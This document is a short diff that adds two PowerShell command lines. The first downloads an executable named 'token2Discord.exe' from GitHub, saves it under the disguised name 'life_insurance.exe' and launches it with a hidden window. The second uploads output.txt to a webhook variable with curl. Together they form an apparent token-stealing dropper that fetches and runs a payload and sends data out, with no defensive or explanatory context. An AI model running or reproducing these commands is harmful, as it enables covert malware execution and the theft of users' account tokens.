@@ -1,0 +1,2 @@
+mkdir temp; cd temp; $down = New-Object System.Net.WebClient; $url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'D:\temp\life_insurance.exe'; $down.DownloadFile($url, $file); Start-Process -FilePath D:\temp\life_insurance.exe -WindowStyle Hidden;
+curl.exe -F "file1=@output.txt" $webhook
